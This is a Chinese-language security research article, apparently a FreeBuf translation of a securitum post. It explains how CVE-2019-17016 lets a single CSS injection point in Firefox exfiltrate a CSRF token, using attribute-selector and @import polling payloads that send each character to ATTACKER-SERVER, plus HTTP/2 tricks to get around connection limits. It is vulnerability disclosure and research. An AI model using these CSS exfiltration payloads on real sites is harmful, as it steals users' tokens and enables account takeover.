![](https://image.3001.net/images/20200215/1581777191_5e4801270d021.png!small)

**在几个月之前，我在Firefox浏览器中发现了一个安全漏洞，这个漏洞就是CVE-2019-17016。在分析这个安全漏洞的过程中，我发现了一种新技术，即利用单一注入点从Firefox浏览器中提取CSS数据。在这篇文章中，我将跟大家详细介绍这项技术。**

##  基础技术和现有技术

在我们的演示样例中，假设我们想获取<input>元素中的CSRF令牌：

    
    
    <input type="hidden" name="csrftoken" value="SOME_VALUE">

可能是由于内容安全策略的原因，这里我们无法使用脚本来实现这个目的，因此我们尝试寻找基于样式的注入点。一般来说，我们会选择使用属性选择器：

    
    
    input[name='csrftoken'][value^='a'] {
    
          background: url(//ATTACKER-SERVER/leak/a);
    
        }
    
        input[name='csrftoken'][value^='b'] {
    
          background: url(//ATTACKER-SERVER/leak/b);
    
        }
    
        ...
    
        input[name='csrftoken'][value^='z'] {
    
          background: url(//ATTACKER-SERVER/leak/z);
    
        }

如果这里部署了CSS规则，那么攻击者就可以获取一个HTTP请求，然后提取令牌的第一个字符。接下来，攻击者需要准备另一个样式表，其中需要包含已窃取的第一个字符：

    
    
    input[name='csrftoken'][value^='aa'] {
    
          background: url(//ATTACKER-SERVER/leak/aa);
    
        }
    
        input[name='csrftoken'][value^='ab'] {
    
          background: url(//ATTACKER-SERVER/leak/ab);
    
        }
    
        ...
    
        input[name='csrftoken'][value^='az'] {
    
          background: url(//ATTACKER-SERVER/leak/az);
    
        }

此时，攻击者需要重新加载目标页面中的<iframe>以提供后续的样式表。

在2018年，P[epe
Vila](https://twitter.com/cgvwzq)提供了一种利用[CSS递归导入](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)的方式实现在Chrome浏览器中的单一注入点利用技术。而在2019年，Nathanial
Lattimer（[@d0nutptr](https://twitter.com/d0nutptr)）基于该技术重新提出了一种
[改进方案](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)，这种技术比较适用于本文针对Firefox浏览器的场景。

在第一次注入时，我们需要用到大量import：

    
    
    @import url(//ATTACKER-SERVER/polling?len=0);
    
        @import url(//ATTACKER-SERVER/polling?len=1);
    
        @import url(//ATTACKER-SERVER/polling?len=2);
    
        ...

###  该技术的运行机制如下：

首先，在一开始只有第一个@import会返回一个样式表，其他语句处于连接阻塞状态。此时，第一个@import返回目标样式表，其中包含了令牌的第一个字符。接下来，当泄露的第一个令牌抵达攻击者的服务器端ATTACKER-SERVER之后，第二个@import将停止阻塞，并返回包含令牌第一个字符的样式表，然后尝试获取令牌中的第二个字符。最后，当第二个泄露字符到达攻击者的服务器端ATTACKER-SERVER之后，第三个@import将停止阻塞……以此类推。

这种技术之所以有效，是因为Chrome会采用异步方式处理@import，因此当任何@import停止阻塞时，Chrome会立即解析该语句并应用执行。

##  Firefox与样式表处理

跟Chrome相比，Firefox针对样式表的处理方式完全不同。首先，Firefox会采用同步方式处理样式表。因此，当样式表中有多个@import时，只有当所有@import都处理完毕时CSS规则才会被应用。比如说：

    
    
    <style>
    
        @import '/polling/0';
    
        @import '/polling/1';
    
        @import '/polling/2';
    
        </style>

假设第一个@import返回CSS规则时，会将页面背景设置为蓝色，后面的@import将处于阻塞状态。在Chrome中，页面会立即变成蓝色，但是在Firefox中却不会有任何反应。

此时，我们可以将所有的@import单独放在<style>元素中：

    
    
    <style>@import '/polling/0';</style>
    
        <style>@import '/polling/1';</style>
    
        <style>@import '/polling/2';</style>

在上述代码中，Firefox会分别处理所有的样式表，此时Firefox中的页面会立刻变蓝色，其他的@import会在后台进行处理。

不过这里还有一个问题，比如说我们想窃取包含10个字符的令牌：

    
    
    <style>@import '/polling/0';</style>
    
        <style>@import '/polling/1';</style>
    
        <style>@import '/polling/2';</style>
    
        ...
    
        <style>@import '/polling/10';</style>

Firefox会立即将10个@import加入队列。在处理完第一个@import之后，Firefox会将带有已知字符的另一个请求加入队列。问题就在于，该请求会被追加到队尾处。在默认情况下，浏览器跟同一个服务器只能建立六条并发链接。因此，带有已知字符的请求永远不会到达目标服务器，因为该服务器已经有六条阻塞链接了，此时便会发生死锁。

##  解决方案：HTTP/2

六条并发链接的限制是由TCP层决定的，因此单台服务器同时只能存在六条TCP链接。而HTTP/2的其中一个优势就在于，它支持通过单个链接来发送多个HTTP请求（即[多路复用](https://stackoverflow.com/questions/36517829/what-does-multiplexing-mean-in-http-2)），从而大大提升网络性能。

但是，Firefox针对单个HTTP/2连接的并发请求数也有限制，默认配置下限制数量为100条。如果需要使用更多的并发链接，则需要使用不同的主机名来设置，并强制Firefox创建第多条TCP链接。

比如说，如果我们创建到[https://localhost:3000](https://localhost:3000/)的100个请求，然后又创建到[https://127.0.0.1:3000](https://127.0.0.1:3000/)的50个请求，那么Firefox就会创建两条TCP链接。

利用技术

技术利用场景如下：

> 1、代码基于HTTP/2实现；
>
>
> 2、“/polling/:session/:index”节点会返回一个CSS并泄露第“:index”个字符。该请求会处于阻塞状态，直到前一个请求成功泄露第“:index-1”个字符为止。其中，“:session”路径参数用来区分多次攻击行为。
>
> 3、通过“/leak/:session/:value”节点来获取完整的令牌，这里的“:value”即为获取到的完整令牌值。
>
>
> 4、为了强制Firefox向同一个服务器发起两条TCP链接，这里用到了两个节点，即[https://localhost:3000](https://localhost:3000/)和[https://127.0.0.1:3000](https://127.0.0.1:3000/)。
>
> 5、使用“/generate”节点来生成样本代码。
>
>
> 我给大家提供了一个[测试站点](https://github.com/securitum/research/blob/master/r2020_firefox-> css-data-> exfil/testbed.html)，它可以利用本文的数据提取技术来窃取csrftoken，广大研究人员可以点击【[这里](https://htmlpreview.github.io/?https:/github.com/securitum/research/blob/master/r2020_firefox-> css-data-exfil/testbed.html)】进行访问。

##  测试演示

![](https://image.3001.net/images/20200215/1581777461_5e4802355f3bf.png!small)

##  视频观看：

 *** 参考来源：[securitum](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

